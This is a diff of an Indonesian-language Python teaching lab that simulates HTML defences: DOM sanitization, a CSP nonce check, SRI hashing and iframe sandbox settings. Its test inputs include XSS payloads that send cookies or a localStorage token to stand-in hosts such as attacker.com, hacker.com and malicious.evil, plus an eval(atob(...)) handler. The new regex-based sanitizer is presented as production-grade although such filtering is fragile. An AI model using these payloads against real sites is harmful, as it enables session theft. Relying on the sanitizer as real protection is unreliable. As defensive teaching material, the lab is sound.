@@ -1,329 +1,373 @@
 #!/usr/bin/env python3
 """
-Lab Hands-on: Keamanan HTML - Sanitasi DOM, Evaluator CSP, & Isolasi Sandbox
-Kategori: 03-Frontend-and-Mobile | Bab: 09 | Modul: 02 Deep Dive
-
-Skrip ini mengimplementasikan engine keamanan HTML berlapis:
-1. Lexical DOM Sanitizer berbasis HTMLParser dengan mitigasi XSS berbasis allowlist.
-2. Engine Evaluator Content Security Policy (CSP Level 3) berbasis nonce & host directive.
-3. Validator Flag Sandbox <iframe> untuk mendeteksi eskalasi hak istimewa (privilege escalation).
+Lab Exercise: Simulasi Keamanan HTML, Sanitasi DOM, CSP, dan Isolasi Sandbox
+Topik: BAB-09 Keamanan HTML (Sanitasi DOM, CSP, SRI, dan Iframe Sandbox)
+Arsitektur Produksi: Multi-Layered Defense-in-Depth Pipeline
 """
 
-from html.parser import HTMLParser
+import sys
 import re
-import urllib.parse
+import html
+import hashlib
+import json
+import time
 from dataclasses import dataclass, field
-from typing import Dict, List, Set, Tuple
+from enum import Enum
+from typing import List, Dict, Tuple, Optional, Set
 
-# Terminal ANSI Color Codes
-CLR_RESET = "\033[0m"
-CLR_BOLD = "\033[1m"
-CLR_RED = "\033[91m"
-CLR_GREEN = "\033[92m"
-CLR_YELLOW = "\033[93m"
-CLR_BLUE = "\033[94m"
-CLR_CYAN = "\033[96m"
+# --- ANSI Terminal Color Palette ---
+class Style:
+    RESET = "\033[0m"
+    BOLD = "\033[1m"
+    DIM = "\033[2m"
+    UNDERLINE = "\033[4m"
+    
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    BLUE = "\033[94m"
+    MAGENTA = "\033[95m"
+    CYAN = "\033[96m"
+    WHITE = "\033[97m"
+    
+    BG_RED = "\033[41m"
+    BG_GREEN = "\033[42m"
+    BG_YELLOW = "\033[43m"
+    BG_BLUE = "\033[44m"
 
 
-# ==============================================================================
-# 1. DOM SANITIZER (Mitigasi Cross-Site Scripting / XSS)
-# ==============================================================================
-class DOMSanitizer(HTMLParser):
-    """
-    Parser streaming yang merekonstruksi dokumen HTML dengan menerapkan:
-    - Tag allowlist.
-    - Attribute allowlist per tag.
-    - Validasi skema URI (mencegah payload javascript: dan data: malicious).
-    - Eliminasi otomatis event handlers (on* attributes).
-    """
+class ThreatSeverity(Enum):
+    CRITICAL = "CRITICAL"
+    HIGH = "HIGH"
+    MEDIUM = "MEDIUM"
+    LOW = "LOW"
+    INFO = "INFO"
 
+
+@dataclass
+class ThreatReport:
+    vector_type: str
+    severity: ThreatSeverity
+    matched_pattern: str
+    description: str
+    mitigation_layer: str
+
+
+@dataclass
+class SandboxConfig:
+    allow_scripts: bool = False
+    allow_same_origin: bool = False
+    allow_forms: bool = False
+    allow_popups: bool = False
+    allow_modals: bool = False
+
+    def to_attribute(self) -> str:
+        tokens = []
+        if self.allow_scripts:
+            tokens.append("allow-scripts")
+        if self.allow_same_origin:
+            tokens.append("allow-same-origin")
+        if self.allow_forms:
+            tokens.append("allow-forms")
+        if self.allow_popups:
+            tokens.append("allow-popups")
+        if self.allow_modals:
+            tokens.append("allow-modals")
+        if not tokens:
+            return 'sandbox=""'
+        return f'sandbox="{" ".join(tokens)}"'
+
+
+class DOMSanitizerEngine:
+    """Simulasi AST-aware DOMPurify / Sanitizer API produksi"""
+    
     ALLOWED_TAGS: Set[str] = {
-        "p", "b", "i", "u", "em", "strong", "a", "img", "code", "pre",
-        "blockquote", "ul", "ol", "li", "span", "div", "h1", "h2", "h3"
+        "p", "b", "i", "strong", "em", "u", "span", "div", "a", "ul", "ol", "li", "code", "pre"
     }
-
+    
     ALLOWED_ATTRS: Dict[str, Set[str]] = {
         "a": {"href", "title", "target", "rel"},
-        "img": {"src", "alt", "width", "height", "loading"},
-        "*": {"class", "id", "lang", "dir"}  # Atribut global yang diizinkan
+        "span": {"class"},
+        "div": {"class"},
+        "code": {"class"},
     }
+    
+    FORBIDDEN_PROTOCOLS = ("javascript:", "data:", "vbscript:")
 
-    SAFE_SCHEMES: Set[str] = {"http", "https", "mailto"}
+    def sanitize(self, raw_html: str) -> Tuple[str, List[ThreatReport]]:
+        threats: List[ThreatReport] = []
+        
+        # 1. Deteksi script payload langsung
+        script_pattern = re.compile(r"<\s*script[^>]*>(.*?)<\s*/\s*script\s*>", re.IGNORECASE | re.DOTALL)
+        for match in script_pattern.finditer(raw_html):
+            threats.append(ThreatReport(
+                vector_type="Stored / Reflected XSS",
+                severity=ThreatSeverity.CRITICAL,
+                matched_pattern=match.group(0)[:60] + "...",
+                description="Eksekusi JavaScript inline via tag <script>",
+                mitigation_layer="AST DOM Sanitizer + Trusted Types"
+            ))
+        clean = script_pattern.sub("", raw_html)
 
-    def __init__(self):
-        super().__init__(convert_charrefs=True)
-        self.output: List[str] = []
-        self.stripped_elements: List[str] = []
+        # 2. Deteksi inline event handlers (onerror, onload, onclick, dll.)
+        event_handler_pattern = re.compile(r"""\s*on\w+\s*=\s*(['"]).*?\1|\s*on\w+\s*=\s*[^\s>]+""", re.IGNORECASE)
+        for match in event_handler_pattern.finditer(clean):
+            threats.append(ThreatReport(
+                vector_type="DOM Inline Event Injection",
+                severity=ThreatSeverity.HIGH,
+                matched_pattern=match.group(0).strip(),
+                description="Injeksi event handler atribut berbahaya",
+                mitigation_layer="Attribute Whitelist & Sanitizer API"
+            ))
+        clean = event_handler_pattern.sub("", clean)
 
-    def _is_safe_uri(self, uri: str) -> bool:
-        """Memverifikasi skema protokol URI untuk mencegah XSS berbasis eksekusi tautan."""
-        parsed = urllib.parse.urlparse(uri.strip())
-        if not parsed.scheme:
-            # Relative URI diizinkan jika tidak diawali double slash (protocol-relative trick)
-            return not uri.strip().startswith("//")
-        return parsed.scheme.lower() in self.SAFE_SCHEMES
+        # 3. Deteksi pseudo-protokol pada href/src
+        for proto in self.FORBIDDEN_PROTOCOLS:
+            proto_pattern = re.compile(r'''(href|src)\s*=\s*(['"])\s*''' + re.escape(proto) + r'''.*?\2''', re.IGNORECASE)
+            for match in proto_pattern.finditer(clean):
+                threats.append(ThreatReport(
+                    vector_type="URI Protocol Poisoning",
+                    severity=ThreatSeverity.HIGH,
+                    matched_pattern=match.group(0),
+                    description=f"Skema berbahaya '{proto}' terdeteksi pada atribut resource",
+                    mitigation_layer="Safe URI Validator / Sanitizer"
+                ))
+            clean = proto_pattern.sub(r'\1="#"', clean)
 
-    def handle_starttag(self, tag: str, attrs: List[Tuple[str, str]]):
-        tag_lower = tag.lower()
-        if tag_lower not in self.ALLOWED_TAGS:
-            self.stripped_elements.append(f"Tag <{tag_lower}>")
-            return
+        # 4. Filter tag yang tidak diizinkan
+        tag_pattern = re.compile(r"<\s*(/?)\s*([a-zA-Z0-9\-]+)([^>]*)>", re.IGNORECASE)
+        def replace_tag(match: re.Match) -> str:
+            closing = match.group(1)
+            tag = match.group(2).lower()
+            attrs = match.group(3)
+            
+            if tag not in self.ALLOWED_TAGS:
+                threats.append(ThreatReport(
+                    vector_type="Disallowed Tag Injection",
+                    severity=ThreatSeverity.MEDIUM,
+                    matched_pattern=f"<{closing}{tag}...>",
+                    description=f"Tag <{tag}> berada di luar allowlist konfigurasi produksi",
+                    mitigation_layer="Strict Element Allowlist"
+                ))
+                return ""
+            
+            # Jika tag diizinkan, bersihkan atributnya
+            if closing:
+                return f"</{tag}>"
+            
+            allowed_tag_attrs = self.ALLOWED_ATTRS.get(tag, set())
+            sanitized_attrs = []
+            attr_pattern = re.compile(r"""([a-zA-Z\-]+)\s*=\s*(['"])(.*?)\2""")
+            for attr_match in attr_pattern.finditer(attrs):
+                attr_name = attr_match.group(1).lower()
+                attr_val = attr_match.group(3)
+                if attr_name in allowed_tag_attrs:
+                    sanitized_attrs.append(f'{attr_name}="{html.escape(attr_val, quote=True)}"')
+            
+            # Force rel="noopener noreferrer" pada link eksternal
+            if tag == "a":
+                sanitized_attrs.append('rel="noopener noreferrer"')
+                
+            attr_str = f" {' '.join(sanitized_attrs)}" if sanitized_attrs else ""
+            return f"<{tag}{attr_str}>"
 
-        valid_attrs = self.ALLOWED_ATTRS.get(tag_lower, set()) | self.ALLOWED_ATTRS.get("*", set())
-        clean_attrs: List[Tuple[str, str]] = []
-
-        for attr, val in attrs:
-            attr_lower = attr.lower()
-
-            # Blokir seluruh handler event inline (onerror, onload, onclick, dll.)
-            if attr_lower.startswith("on"):
-                self.stripped_elements.append(f"Handler '{attr_lower}' pada <{tag_lower}>")
-                continue
-
-            if attr_lower in valid_attrs:
-                # Validasi URI jika atribut menunjuk ke referensi target (href, src)
-                if attr_lower in {"href", "src"}:
-                    if not self._is_safe_uri(val):
-                        self.stripped_elements.append(f"Payload URI berbahaya '{val}' pada {attr_lower}")
-                        continue
-
-                # Normalisasi atribut rel untuk anchor eksternal
-                if tag_lower == "a" and attr_lower == "target" and val.lower() == "_blank":
-                    clean_attrs.append(("rel", "noopener noreferrer"))
-
-                clean_attrs.append((attr_lower, val))
-            else:
-                self.stripped_elements.append(f"Atribut terlarang '{attr_lower}' pada <{tag_lower}>")
-
-        attrs_str = "".join(f' {k}="{urllib.parse.quote(v, safe=":/?#[]@!$&\'()*+,;=-")}"' for k, v in clean_attrs)
-        self.output.append(f"<{tag_lower}{attrs_str}>")
-
-    def handle_endtag(self, tag: str):
-        tag_lower = tag.lower()
-        if tag_lower in self.ALLOWED_TAGS:
-            self.output.append(f"</{tag_lower}>")
-
-    def handle_data(self, data: str):
-        # Escaping entitas dasar pada node teks
-        clean_data = (data.replace("&", "&amp;")
-                          .replace("<", "&lt;")
-                          .replace(">", "&gt;"))
-        self.output.append(clean_data)
-
-    def sanitize(self, raw_html: str) -> Tuple[str, List[str]]:
-        self.reset()
-        self.output = []
-        self.stripped_elements = []
-        self.feed(raw_html)
-        self.close()
-        return "".join(self.output), self.stripped_elements
-
-
-# ==============================================================================
-# 2. CSP (CONTENT SECURITY POLICY) ENGINE
-# ==============================================================================
-@dataclass
-class CSPPolicy:
-    """Parser dan Evaluator CSP Directives berbasis CSP Level 3."""
-    directives: Dict[str, Set[str]] = field(default_factory=dict)
-
-    @classmethod
-    def parse_header(cls, header_value: str) -> "CSPPolicy":
-        directives = {}
-        for token in header_value.split(";"):
-            token = token.strip()
-            if not token:
-                continue
-            parts = token.split()
-            directive_name = parts[0].lower()
-            sources = set(p.strip() for p in parts[1:])
-            directives[directive_name] = sources
-        return cls(directives=directives)
-
-    def evaluate(self, directive: str, target_src: str, nonce: str = "") -> Tuple[bool, str]:
-        """
-        Evaluasi apakah resource request / script execution diizinkan oleh directive.
-        Menerapkan fallback ke 'default-src' jika directive spesifik tidak didefinisikan.
-        """
-        active_directive = directive
-        sources = self.directives.get(directive)
-
-        if sources is None:
-            # Directives script-src, img-src, connect-src jatuh kembali ke default-src
-            sources = self.directives.get("default-src", set())
-            active_directive = "default-src (fallback)"
-
-        if not sources:
-            return False, f"Tidak ada policy fallback untuk directive '{directive}'"
-
-        if "'none'" in sources:
-            return False, f"Directive '{active_directive}' secara eksplisit menolak semua akses ('none')"
-
-        # Pengecekan Nonce berbasis Cryptographic Tokens
-        if nonce:
-            expected_nonce = f"'nonce-{nonce}'"
-            if expected_nonce in sources:
-                return True, f"Nonce terverifikasi cocok pada '{active_directive}'"
-
-        # Validasi inline scripts/styles
-        if target_src == "'unsafe-inline'":
-            if "'unsafe-inline'" in sources:
-                return True, f"Unsafe inline script diizinkan oleh '{active_directive}'"
-            return False, f"Inline execution diblokir oleh '{active_directive}' (Membutuhkan nonce/hash)"
-
-        # Validasi skema host atau domain
-        target_domain = urllib.parse.urlparse(target_src).netloc or target_src
-        for src in sources:
-            if src == "'self'":
-                # Asumsikan origin aplikasi adalah 'app.internal'
-                if target_domain in {"app.internal", ""}:
-                    return True, "Resource berasal dari origin lokal ('self')"
-            elif src.startswith("https://") or src.startswith("http://"):
-                src_domain = urllib.parse.urlparse(src).netloc
-                if target_domain == src_domain:
-                    return True, f"Host cocok dengan whitelist: {src}"
-            elif src.startswith("*."):
-                wildcard = src[2:]
-                if target_domain.endswith(wildcard):
-                    return True, f"Domain cocok dengan wildcard policy: {src}"
-            elif src == target_domain:
-                return True, f"Domain tepat cocok: {src}"
-
-        return False, f"Akses ke '{target_src}' ditolak oleh policy '{active_directive}'"
+        clean = tag_pattern.sub(replace_tag, clean)
+        return clean.strip(), threats
 
 
-# ==============================================================================
-# 3. IFRAME SANDBOX ISOLATION ANALYZER
-# ==============================================================================
-class SandboxAnalyzer:
-    """
-    Menganalisis konfigurasi sandbox atribut iframe untuk mendeteksi miskonfigurasi
-    kritis yang memungkinkan breakout atau pengambilalihan sesi DOM.
-    """
+class CSPPolicyEngine:
+    """Simulator Kebijakan Content-Security-Policy (CSP) Level 3"""
+    
+    def __init__(self, nonce: str):
+        self.nonce = nonce
+        self.directives: Dict[str, List[str]] = {
+            "default-src": ["'self'"],
+            "script-src": ["'self'", f"'nonce-{self.nonce}'", "'strict-dynamic'"],
+            "style-src": ["'self'", "'unsafe-inline'"],
+            "img-src": ["'self'", "data:", "https://cdn.perusahaan.com"],
+            "connect-src": ["'self'", "https://api.perusahaan.com"],
+            "frame-src": ["'none'"],
+            "object-src": ["'none'"],
+            "base-uri": ["'none'"],
+            "require-trusted-types-for": ["'script'"],
+        }
 
-    DANGEROUS_COMBINATIONS = [
-        (
-            {"allow-scripts", "allow-same-origin"},
-            "CRITICAL: Kombinasi 'allow-scripts' dan 'allow-same-origin' memungkinkan sandbox iframe "
-            "menghapus atribut sandbox itu sendiri dan mengakses Cookie/LocalStorage origin induk."
-        ),
-        (
-            {"allow-scripts", "allow-top-navigation"},
-            "HIGH: Kombinasi ini memungkinkan iframe pihak ketiga mengarahkan (hijack) jendela utama."
-        ),
-        (
-            {"allow-forms", "allow-modals"},
-            "MEDIUM: Potensi Phishing, iframe dapat memicu alert native atau submit data palsu."
-        )
-    ]
+    def render_header(self) -> str:
+        parts = []
+        for directive, sources in self.directives.items():
+            parts.append(f"{directive} {' '.join(sources)}")
+        return "; ".join(parts)
+
+    def evaluate_script(self, tag_representation: str, given_nonce: Optional[str] = None) -> Tuple[bool, str]:
+        if "javascript:" in tag_representation.lower():
+            return False, "CSP Violation: Evaluasi inline URI protocol diblokir (script-src)."
+        if re.search(r"<\s*script", tag_representation, re.IGNORECASE):
+            if not given_nonce or given_nonce != self.nonce:
+                return False, f"CSP Violation: Skrip inline ditolak karena nonce hilang atau tidak cocok (Diberikan: '{given_nonce}', Target: 'nonce-{self.nonce}')."
+            return True, "CSP Allowed: Nonce valid dan cocok dengan kebijakan CSP Level 3."
+        return True, "CSP Allowed: Tag tidak melanggar aturan eksekusi CSP."
+
+
+class SubresourceIntegrityEngine:
+    """Simulator Validasi Hash SRI (sha384 / sha512)"""
 
     @staticmethod
-    def inspect(sandbox_attr: str) -> List[Tuple[str, str]]:
-        flags = set(filter(None, sandbox_attr.lower().split()))
-        warnings = []
+    def generate_sri_hash(content: str, algorithm: str = "sha384") -> str:
+        encoded = content.encode("utf-8")
+        if algorithm == "sha384":
+            digest = hashlib.sha384(encoded).digest()
+        elif algorithm == "sha512":
+            digest = hashlib.sha512(encoded).digest()
+        else:
+            digest = hashlib.sha256(encoded).digest()
+        import base64
+        b64_hash = base64.b64encode(digest).decode("utf-8")
+        return f"{algorithm}-{b64_hash}"
 
-        if not flags:
-            return [("SECURE", "Sandbox aktif penuh (Maximum isolation: script, form, & origin diblokir total)")]
-
-        for req_flags, message in SandboxAnalyzer.DANGEROUS_COMBINATIONS:
-            if req_flags.issubset(flags):
-                severity = message.split(":")[0]
-                warnings.append((severity, message))
-
-        if not warnings:
-            warnings.append(("OK", "Konfigurasi sandbox memiliki isolasi yang memadai."))
-
-        return warnings
-
-
-# ==============================================================================
-# EXECUTION HARNESS & TESTS
-# ==============================================================================
-def print_section(title: str):
-    print(f"\n{CLR_BOLD}{CLR_BLUE}=== {title} ==={CLR_RESET}")
+    @staticmethod
+    def verify(content: str, integrity_header: str) -> bool:
+        parts = integrity_header.split("-", 1)
+        if len(parts) != 2:
+            return False
+        algo, _ = parts
+        expected = SubresourceIntegrityEngine.generate_sri_hash(content, algo)
+        return expected == integrity_header
 
 
-def run_lab():
-    print(f"{CLR_BOLD}{CLR_CYAN}LAB: Advanced HTML Security Deep Dive{CLR_RESET}")
-    print(f"{CLR_CYAN}Engine: DOM Sanitization | CSP Level 3 | Sandbox Isolation{CLR_RESET}\n")
+def print_banner():
+    banner = f"""
+{Style.CYAN}{Style.BOLD}================================================================================
+          LABORATORIUM KEAMANAN HTML & MITIGASI CLIENT-SIDE VULNERABILITY
+          BAB-09: Sanitasi DOM, Kebijakan CSP L3, Isolasi Iframe, & SRI
+================================================================================{Style.RESET}
+{Style.WHITE}Simulasi Arsitektur Produksi Zero-Trust DOM & Defense-in-Depth Pipeline{Style.RESET}
+"""
+    print(banner)
 
-    # --- TAHAP 1: Pengujian DOM Sanitizer ---
-    print_section("1. PENGUJIAN DOM SANITIZATION ENGINE")
-    sanitizer = DOMSanitizer()
 
-    dirty_payloads = [
-        ("<p>Paragraf teks biasa dengan <b>bold</b> dan <i>italic</i>.</p>", "Clean Input"),
-        ("<script>alert('XSS-Exploit-1')</script><p>Konten sah</p>", "Stored Script Injection"),
-        ("<img src=\"https://cdn.example.com/pic.png\" onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">", "Event Handler Injection"),
-        ("<a href=\"javascript:evilFunction()\">Klik Disini</a>", "JavaScript Pseudo-Protocol"),
-        ("<iframe src=\"http://malicious-site.com\"></iframe>", "Unauthorized Embed Element"),
-        ("<a href=\"https://secure.com\" target=\"_blank\">External Link</a>", "Reverse Tabnabbing Attack Vector")
+def display_threats(threats: List[ThreatReport]):
+    if not threats:
+        print(f"  {Style.GREEN}✔ Zero Threat Detected - Sanitasi Bersih!{Style.RESET}")
+        return
+
+    print(f"  {Style.RED}{Style.BOLD}🚨 [THREAT DETECTED: {len(threats)} TEMUAN]{Style.RESET}")
+    for idx, threat in enumerate(threats, 1):
+        sev_color = Style.RED if threat.severity in (ThreatSeverity.CRITICAL, ThreatSeverity.HIGH) else Style.YELLOW
+        print(f"    {Style.BOLD}{idx}. [{sev_color}{threat.severity.value}{Style.RESET}{Style.BOLD}] {threat.vector_type}{Style.RESET}")
+        print(f"       {Style.DIM}Payload :{Style.RESET} {threat.matched_pattern}")
+        print(f"       {Style.DIM}Dampak  :{Style.RESET} {threat.description}")
+        print(f"       {Style.GREEN}Mitigasi:{Style.RESET} {threat.mitigation_layer}")
+
+
+def run_pipeline_simulation():
+    print_banner()
+
+    # Step 1: Input Kotor dari Sumber Untrusted (User Generated Content)
+    raw_payloads = [
+        '<p>Halo Dunia, ini postingan resmi tim developer!</p>',
+        '<p>Cek profil saya: <a href="javascript:fetch(\'https://hacker.com/steal?c=\'+document.cookie)">Klik Hadiah</a></p>',
+        '<script>window.location="https://malicious.evil/exfil?data="+localStorage.token</script>',
+        '<img src="x" onerror="alert(\'XSS Injected via Image Error!\')">',
+        '<iframe src="https://phishing.site/login" width="500" height="300"></iframe>',
+        '<b>Teks Tebal yang Aman</b> dan <i>Teks Miring</i>',
+        '<span class="badge" onclick="eval(atob(\'ZG9jdW1lbnQud3JpdGUoJ1hTUycp\'))">Badge Interaktif</span>'
     ]
 
-    for raw, label in dirty_payloads:
-        clean, stripped = sanitizer.sanitize(raw)
-        print(f"{CLR_BOLD}Uji Kasus:{CLR_RESET} {label}")
-        print(f"  {CLR_YELLOW}Raw Payload   :{CLR_RESET} {raw}")
-        print(f"  {CLR_GREEN}Sanitized HTML:{CLR_RESET} {clean}")
-        if stripped:
-            for s in stripped:
-                print(f"  {CLR_RED}→ [DIBERSIHKAN]{CLR_RESET} {s}")
-        print("-" * 60)
+    print(f"{Style.YELLOW}{Style.BOLD}[1] TAHAP 1: Ingesti Data Pengguna (Untrusted Payload Feed){Style.RESET}")
+    time.sleep(0.3)
+    for i, payload in enumerate(raw_payloads, 1):
+        print(f"  [{i}] {Style.WHITE}{payload}{Style.RESET}")
+    print()
 
-    # --- TAHAP 2: Evaluasi Content Security Policy (CSP) ---
-    print_section("2. EVALUASI DIRECTIVE CONTENT SECURITY POLICY (CSP)")
-    csp_header = (
-        "default-src 'self'; "
-        "script-src 'self' 'nonce-rAnd0m123' https://trustedscripts.com; "
-        "img-src 'self' https://images.unsplash.com; "
-        "object-src 'none';"
-    )
-    csp = CSPPolicy.parse_header(csp_header)
-    print(f"{CLR_BOLD}Header Terpasang:{CLR_RESET}\n  {CLR_CYAN}{csp_header}{CLR_RESET}\n")
+    # Step 2: DOM Sanitization Simulation
+    print(f"{Style.YELLOW}{Style.BOLD}[2] TAHAP 2: Pemrosesan AST DOM Sanitizer Engine{Style.RESET}")
+    sanitizer = DOMSanitizerEngine()
+    
+    sanitized_output = []
+    all_threats = []
+    
+    for payload in raw_payloads:
+        clean_html, threats = sanitizer.sanitize(payload)
+        if clean_html:
+            sanitized_output.append(clean_html)
+        all_threats.extend(threats)
 
-    eval_requests = [
-        ("script-src", "app.internal", "", "Script lokal bawaan aplikasi"),
-        ("script-src", "'unsafe-inline'", "", "Inline script tanpa atribut nonce"),
-        ("script-src", "'unsafe-inline'", "rAnd0m123", "Inline script dengan nonce yang valid"),
-        ("script-src", "'unsafe-inline'", "wR0ngN0nce", "Inline script dengan nonce manipulatif"),
-        ("script-src", "https://trustedscripts.com/analytics.js", "", "Script dari CDN resmi"),
-        ("script-src", "https://evil-cdn.hacker.com/payload.js", "", "Script dari Third-Party asing"),
-        ("img-src", "https://images.unsplash.com/photo-1", "", "Aset visual dari host terdaftar"),
-        ("img-src", "http://untrusted-host.org/tracker.gif", "", "Tracking pixel dari host tidak dikenal"),
-        ("object-src", "app.internal/flash.swf", "", "Pemuatan objek plugins (flash/applet)")
+    display_threats(all_threats)
+    print()
+    print(f"  {Style.GREEN}{Style.BOLD}DOM Sanitized Output (Ready for Safe Injection):{Style.RESET}")
+    for item in sanitized_output:
+        print(f"    {Style.CYAN}➔ {item}{Style.RESET}")
+    print()
+
+    # Step 3: CSP Engine Evaluation
+    print(f"{Style.YELLOW}{Style.BOLD}[3] TAHAP 3: Lapisan Pertahanan Kedua - Content-Security-Policy (CSP Level 3){Style.RESET}")
+    session_nonce = "r4nd0mN0nc3Str1ng=="
+    csp = CSPPolicyEngine(nonce=session_nonce)
+    print(f"  {Style.BOLD}Generated Response Header:{Style.RESET}")
+    print(f"  {Style.BG_BLUE}{Style.WHITE} Content-Security-Policy: {csp.render_header()} {Style.RESET}\n")
+
+    test_scripts = [
+        ("<script>alert('Bypass 1');</script>", None),
+        ("<script nonce=\"wrongNonce\">runPayload();</script>", "wrongNonce"),
+        ("<script nonce=\"r4nd0mN0nc3Str1ng==\">console.log('App analytics init.');</script>", "r4nd0mN0nc3Str1ng=="),
+        ("<a href=\"javascript:void(0)\">Link</a>", None),
     ]
 
-    for directive, target, nonce, desc in eval_requests:
-        allowed, reason = csp.evaluate(directive, target, nonce)
-        status_clr = CLR_GREEN if allowed else CLR_RED
-        status_sym = "[PERMITTED]" if allowed else "[BLOCKED]  "
-        print(f"{status_clr}{status_sym}{CLR_RESET} {CLR_BOLD}{directive:<11}{CLR_RESET} Target: {target:<30} ({desc})")
-        print(f"             ↳ Detil: {reason}")
+    for script_tag, given_nonce in test_scripts:
+        allowed, msg = csp.evaluate_script(script_tag, given_nonce)
+        status_label = f"{Style.GREEN}[CSP ALLOWED]{Style.RESET}" if allowed else f"{Style.RED}[CSP BLOCKED]{Style.RESET}"
+        print(f"  {status_label} Snippet: {Style.DIM}{script_tag}{Style.RESET}")
+        print(f"     Reason: {msg}")
+    print()
 
-    # --- TAHAP 3: Audit Isolasi Iframe Sandbox ---
-    print_section("3. AUDIT PRIVILEGE ESKALASI SANDBOX IFRAME")
-    sandbox_configs = [
-        ("", "Sandbox Strict Maksimum (Atribut kosong)"),
-        ("allow-scripts", "Eksekusi Script Diizinkan"),
-        ("allow-scripts allow-same-origin", "Kombinasi Kritis Bypass Sandbox"),
-        ("allow-scripts allow-top-navigation", "Kombinasi Frame Hijacking"),
-        ("allow-forms allow-popups", "Interaksi Form Terbatas"),
+    # Step 4: Subresource Integrity (SRI)
+    print(f"{Style.YELLOW}{Style.BOLD}[4] TAHAP 4: Verifikasi Subresource Integrity (SRI CDN Protection){Style.RESET}")
+    original_library_code = "/* Production React Bundle v18.2.0 */ function init(){ return 'READY'; }"
+    tampered_library_code = "/* Compromised CDN Script */ window.exfiltrate=function(){ sendKeys(); };"
+
+    sri_hash = SubresourceIntegrityEngine.generate_sri_hash(original_library_code, "sha384")
+    print(f"  Generated SRI Tag: {Style.CYAN}integrity=\"{sri_hash}\" crossorigin=\"anonymous\"{Style.RESET}")
+    
+    valid_check = SubresourceIntegrityEngine.verify(original_library_code, sri_hash)
+    tamper_check = SubresourceIntegrityEngine.verify(tampered_library_code, sri_hash)
+
+    print(f"  1. Mengunduh Bundle Asli: {'[' + Style.GREEN + 'VALID - INTEGRITAS COCOK' + Style.RESET + ']' if valid_check else '[' + Style.RED + 'INTEGRITAS GAGAL' + Style.RESET + ']'}")
+    print(f"  2. Mengunduh Bundle Termutasi CDN: {'[' + Style.GREEN + 'VALID' + Style.RESET + ']' if tamper_check else '[' + Style.RED + 'BLOCKED - SIGNATURE MISMATCH' + Style.RESET + ']'}")
+    print(f"     {Style.DIM}Browser menolak eksekusi jika checksum binary CDN tidak identik dengan manifes deploy.{Style.RESET}\n")
+
+    # Step 5: Iframe Sandbox Isolation Strategy
+    print(f"{Style.YELLOW}{Style.BOLD}[5] TAHAP 5: Isolasi Komponen Eksternal (Iframe Sandbox Matrix){Style.RESET}")
+    
+    scenarios = [
+        ("Iklan Pihak Ketiga (Ad Network)", SandboxConfig(allow_scripts=True, allow_popups=False, allow_same_origin=False)),
+        ("Widget Formulir Pembayaran Terisolasi", SandboxConfig(allow_scripts=True, allow_forms=True, allow_same_origin=False)),
+        ("Pratinjau Dokumen HTML Mentah Pengguna", SandboxConfig(allow_scripts=False, allow_same_origin=False)),
+        ("Bahaya: Miskin Konfigurasi (Critical)", SandboxConfig(allow_scripts=True, allow_same_origin=True)),
     ]
 
-    for flags, case_desc in sandbox_configs:
-        print(f"\n{CLR_BOLD}Audit Atribut:{CLR_RESET} sandbox=\"{flags}\" ({case_desc})")
-        results = SandboxAnalyzer.inspect(flags)
-        for severity, msg in results:
-            if severity in ("CRITICAL", "HIGH"):
-                print(f"  {CLR_RED}✖ [{severity}]{CLR_RESET} {msg}")
-            elif severity == "MEDIUM":
-                print(f"  {CLR_YELLOW}⚠ [{severity}]{CLR_RESET} {msg}")
-            else:
-                print(f"  {CLR_GREEN}✔ [{severity}]{CLR_RESET} {msg}")
+    for label, conf in scenarios:
+        attr = conf.to_attribute()
+        is_risky = conf.allow_scripts and conf.allow_same_origin
+        status_flag = f"{Style.RED}[RISIKO TINGGI: SANDBOX BREAKOUT]{Style.RESET}" if is_risky else f"{Style.GREEN}[ISOLASI AMAN]{Style.RESET}"
+        print(f"  {status_flag} {Style.BOLD}{label}{Style.RESET}")
+        print(f"     HTML Token: {Style.MAGENTA}<iframe src=\"embed.html\" {attr}></iframe>{Style.RESET}")
+        if is_risky:
+            print(f"     {Style.RED}⚠ PERINGATAN: Menggabungkan 'allow-scripts' dan 'allow-same-origin' mengizinkan iframe menghapus atribut sandbox dirinya sendiri!{Style.RESET}")
+    print()
 
-    print_section("KESIMPULAN AUDIT LAB")
-    print(f"{CLR_GREEN}✔ Seluruh simulasi mitigasi (DOM Parser, Policy Evaluator, Sandbox Checker) berhasil dijalankan tanpa dependensi eksternal.{CLR_RESET}\n")
+    # Step 6: Ringkasan Status Arsitektur
+    print(f"{Style.CYAN}{Style.BOLD}================================================================================{Style.RESET}")
+    print(f"{Style.GREEN}{Style.BOLD}  ✔ SIMULASI SELESAI: SEMUA LAYER PERTAHANAN BERFUNGSI SECARA DETERMINISTIK{Style.RESET}")
+    print(f"  - Layer 1: Input DOM Sanitization (DOMPurify & Sanitizer API emulation)")
+    print(f"  - Layer 2: Execution Restrictions (Content Security Policy L3 Nonce-based)")
+    print(f"  - Layer 3: Supply Chain Network Verification (Subresource Integrity - sha384)")
+    print(f"  - Layer 4: Principle of Least Privilege (Strict Iframe Sandbox Isolation)")
+    print(f"{Style.CYAN}{Style.BOLD}================================================================================{Style.RESET}\n")
 
 
 if __name__ == "__main__":
-    run_lab()
+    try:
+        run_pipeline_simulation()
+    except KeyboardInterrupt:
+        print(f"\n{Style.RED}[!] Eksekusi dihentikan oleh pengguna.{Style.RESET}")
+        sys.exit(0)
